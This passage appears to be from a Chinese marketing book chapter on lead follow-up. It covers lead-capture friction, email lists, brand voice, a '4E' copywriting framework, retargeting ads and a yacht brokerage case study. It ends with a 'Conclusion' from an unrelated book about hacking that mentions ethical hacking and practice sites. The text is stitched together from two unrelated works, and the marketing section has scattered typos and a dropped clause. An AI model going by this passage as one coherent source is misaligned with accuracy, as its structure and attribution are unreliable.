  \ effect）：最近的通信将比之前所有的通信都更有分量。\n\n我们经常被问诸此类的问题：“我应该向潜在客户索取多少信息？我应该只询问名字和邮箱吗？我应该要电话和他们感兴趣的内容吗？我应该问他们是从哪里知道我们的吗？”有些专家会建议索要更多信息，而另一些人则建议少要一些。两种建议都没有错；这取决于你的场景和情况。\n\
  \n从潜在客户处索取的信息量差异大致可以分为“高门槛请求”和“低摩擦请求”。高门槛信息请求会要求提供许多信息，以试图产生更高质量的线索（leads）；你对线索的了解越多，该线索的质量就越高。这里的理解是，潜在客户对购买你的商品或服务越认真，他们就越倾向于给你提供信息。对于那些饱受低质量流量困扰并担心浪费销售资源的公司来说，索要更多信息是一个好方法。\n\
  \n对于那些希望实现流量最大化且能够处理一定程度低质量线索的公司来说，低摩擦的信息请求是合适的方法。通常，你向潜在客户索要的联系信息越多，“摩擦”就越大，潜在客户遵循你请求的可能性就越小。\n\
  \n混合型信息捕获方法是在跟进过程中收集信息。例如，你可以从低摩擦的名字和邮箱请求开始，并在潜在客户通过后续问卷与你的内容互动时收集更多线索情报。然而，随着时间的推移收集信息需要一个更健壮的系统，能够整合线索信息。因此，混合方法通常是公司在实施了简单的解决方案后才会进化的目标。\n\
  \n许多公司会迅速否定获取电子邮件地址的价值。“谁会想要另一份数字简报？”他们问道。“人们不再读邮件了！”他们惊呼道。考虑到电子邮件被用于网上银行、航班信息和在线购物更新等关键通信，它在短期内不太会被取代。至于人们是否想要简报，答案是大多数人并不想要。但对于许多购买行为，消费者会经历一个研究阶段，提供教育的公司是一项增值服务。在提供消费者教育的许多方式中，电子邮件是最成本效益的如果你销售的是不需要研究阶段的产品，你可以通过折扣来激励个人。无论你提供什么激励或信息，合格潜在客户的数据库都具有重大的实际价值。\n\
  \n建立潜在客户数据库的主要价值在于两个方面：对于面临季节性或周期性的公司，向你的线索列表发送一条信息可以帮助你控制业务的起伏。此外，当你发布新产品和服务时，你将有一个可以立即开发的受众。事实上，我们曾与一些公司合作，他们从自己的数据库中招募忠实客户，帮助在产品开发过程中提供反馈。如果你未来要出售业务，控制季节性和拥有发布受众具有显而易见的价值。我们见过整个公司仅因为其线索和客户数据库就被以数百万出售。\n\
  \n## 流程\n\n在设计跟进序列之前，清晰表述品牌声音（brand voice）至关重要。声音是品牌产写作的一套规则，是对目标受众有深入理解的功能。可以进一步假设，倾向于注册接收更多跟进信息的个人，对基于逻辑（logic）的修辞的反应会比那些基于情感（pathos）决策且无需进行深度调查就购买的客户群体更大。\n\
  \n一旦品牌声音清晰表述，就可以应用文案 4E 框架来撰写吸引并激励信息的内容。广义地说，你传递的“E”越多越好：\n\n### 文案的 4E 框架\n\n-\
  \ **参与性 (Engaging)**：内容是否引人注目并让读者感兴趣？\n- **教育性 (Educational)**：内容是否在教读者与你的产品或服务相关的知识？\n\
  - **娱乐性 (Entertaining)**：读者会喜欢阅读你的内容吗？\n- **情感性 (Emotional)**：你的内容会引起读者内的情绪吗？\n\n\
  4E 框架在你跟进信息的潜在影响和影响力时，作为一个坚实的心理检查清单。虽然可能不需要一直触及所有四点，但 4E 框架为你提供了一个建立信任、权威和良好关系的自评标准。\n\
  \n在构建跟进过程中，一个常见的障碍是想出写作的主题。与其他组件一样，ASP™ Follow-Up 是你已经采用的模拟过程的数字化体现。对潜在买家的跟进电话和直邮是可以在数字上复制的模拟平行对应物。我们在构建跟进流程时作为起点的框架如下：\n\
  \n### 即使你没有获得他们的联系信息\n\n\n\n\n\n回到我们那一百个网站访客的示例案例，你可能会获得三个人直接购买，另有三个人订阅了你的潜在客户磁铁（lead\
  \ magnet），并可能在以后向你处购买。虽然这个数字看起来可能微不足道，但假设这三位订阅的潜在客户中有一人向你购买了，你的销售额就增加了 33%，这并不糟糕。美妙的一点是，你有一种方法可以始终出现在所有网站访客面前，即使他们没有给你留下联系方式。你保持在所有网站访客面前的方法是一种被称为“重定向投放”（retargeting，也称为“再营销”）的广告方法。重定向投放让你能够获得像\
  \ `Coca-Cola` 这样价值数十亿美元品牌的曝光频率，而无需数十亿美元的广告预算。\n\n重定向投放的工作原理是通过用户的网络浏览器识别并记住访问过你网站的用户，并在他们浏览网络其他地方时向他们投放广告。无论他们是在浏览社交媒体网站还是阅读他们喜爱的博客，重定向都能让你将广告精准地投放给之前访问过你网站的人。这种方法非常强大，因为它允许你针对对你的特定产品、服务或品牌表现出兴趣的个人进行市场营销。\n\
  \n回到“广告七法则”（Advertising Rule of 7），重定向广告是某人记住你的品牌还是遗忘你的关键区别。第一个品牌印象可能是按点击付费的广告，第二个品牌印象将是你的网站，而第三到第七次印象将来自重定向广告。你可能认为这种强大的广告形式会极其昂贵，但除非你的每月访客超过一万名，否则你的广告支出每月可能不到一百美元。对于大多数在本地经营业务的商家来说，每月访客量在几千人之间，因此这是一个非常低成本且令人愉悦的于实施的增长黑客手段（growth\
  \ hack）。\n\n从类别上划分，我们将重定向广告单元分为两种主要类型：基于品牌的广告单元和直接响应型广告单元。直觉上，基于品牌的广告单元传达的是你的整体品牌或公司，而直接响应型广告单元则关注特定的产品或服务。在开始阶段，我们建议启动基于品牌的广告单元，并重定向访问过你网站任何页面的访客。如果你只提供单一的产品或服务，那么你可能尝试针对所有访客投放直接响应式广告。否则，对于那些月访客过万且提供多种产品或服务的公司，你可以进行更精细的操作，重定向到访问过特定页面的人。例如，如果你是一个同时也提供太阳能安装服务的屋顶维修商，你可以向访问过你网站太阳能页面的潜在客户投放太阳能广告。\n\
  \n## 增长黑客技巧\n\n减少重定向广告成本的一种方法是通过“像素清除”（pixel burning）。对于拥有在线支付门户的网站（如电子商务网站），你可以隔离已完成支付的人，并将这些人从重定向人群中移除，因为他们已经完成了所需的操作。\n\
  \n## 增长黑客应用\n\n当我们调查情况时，那家游艇经纪公司的销售额下滑似乎与经纪人人数的减少直接相关。经纪人通过佣金赚钱，而销售的停滞导致几位经纪人去寻找其他工作。\n\
  \n当我们与剩下的经纪人交谈时，他们谈到了如何忙于跟进通讯录（Rolodex）中成千上万的潜在客户，特别是他们承担了此前由离职经纪人处理的潜在客户。\n\n当我们询问经纪人“哪些潜在客户最重要？”时，他们简短地回答道：“他们都很重要。”当我们修改问题，询问“在八周后的晚会之前，哪些潜在客户最有可能购买？”时，他们再次回答道：“他们购买的可能性相等；他们想好买时就会买。”\n\
  \n如果所有潜在客户都同样重要且购买概率相等，我们需要建立一种方法，让经纪人在晚会之前礼貌且不打扰地多次跟进，以最大化提高交易发生的可能性。简单来说，经纪人需要杠杆。\n\
  \n我们实施的第一项措施是自动回复邮件活动。在与游艇经纪人的交谈中，我们针对所有常见问题和常见意见汇编了完美的答案。我们还撰写了传达游艇梦想生活的客户故事。为了配合自动回复技术，我们还实施了强有力的重定向展示广告活动，让潜在客户在几乎每次在线浏览时都能看到经纪公司的品牌名称呈现在他们面前。\n\
  \n结果，那家游艇经纪公司在晚会之前不仅卖了一只游艇；他们卖出了多只。在活动期间，一位最近的游艇买家走向我们的客户并告诉他：“我随处都能看到你的游艇广告，我将其视为某种更高力量在告诉我，是时候最终下定决心购买一艘游艇了。”仅仅通过这一评论，游艇经纪公司的老板瞬间从一个增长黑客的怀疑论者变成了增长黑客的信徒。`Follow-Up`\
  \ 的实施为经纪公司带来了创纪录的销售年，并帮助他们进入了显示没有放缓迹象的销售轨道。更令人印象深刻的是，这一创纪录销售年是在没有额外招聘一名员工的情况下实现的。\n\
  \n## Follow-Up 核心总结\n\n- 广告七法则指出，一个人大约需要七次触达才能记住你的品牌。\n- 将你的 `Follow-Up` 计划与你的平均销售周期长度相匹配。\n\
  - 你向潜在客户索取的信息越多，“摩擦”就越大，这导致潜在客户不太可能提供所要求的信息。\n- 应用文案写作的 4E 框架来编写吸引并激励人心的信息：参与性（Engaging）、教育性（Educational）、娱乐性（Entertaining）和情感（Emotional）。\n\
  - 重定向允许你将广告精准地投放给之前访问过你网站的人。\n- 基于品牌的广告单元传达的是你的整体品牌或公司，而直接响应型广告单元则关注特定的产品或服务。\n\n\
  # 结论\n\n至此，我们已经离开了本书的末尾。在计算机网络世界，安全被高度重视，以保护数据并防止系统受入侵者侵害。尽管有严格的安全准则和验证方案，黑客仍然设巧妙地攻入了几个系统，引起了普通人的兴趣。\n\
  \n我已清晰且全面地解释了所有的黑客概念；然而，最初将它们全部付诸实践可能看起来很难。但不要灰馁。黑客取决于实践以及良好的解决问题能力。利用像“Hack this\
  \ site”这样的网站，它们允许黑客合法地测试他们的黑客技巧。此外，如果你觉得这一切对你来说太技术化了，不要犹豫，尽管向专业安全专家寻求帮助。\n\n\n\n\
  \n\n到这里，你已经对黑客攻击以及当外部或内部人员攻击你的系统时会产生的后果有了良好的了解。但请不要担心，只需遵循书中提供的指令和指南，你就可以放心地确保你的系统得到良好保护。\n\
  \n请注意，计算机世界始终在不断变化和进步。系统越先进，你就越需要提高自己的知识水平。\n\n同样重要的一点是，滥用黑客技能进行非法活动将受到法律的惩处。大多数国家对黑帽黑客实施的网络犯罪都有非常严格的法律。因此，将自己的黑客技能限制在道德黑客范围内，并利用这些技能测试自己设备的安全性，或协助机构测试其安全系统的稳健性，是至关重要的。\n\
  \n再次感谢你选择这本书，希望你阅读得愉快。\n\n"
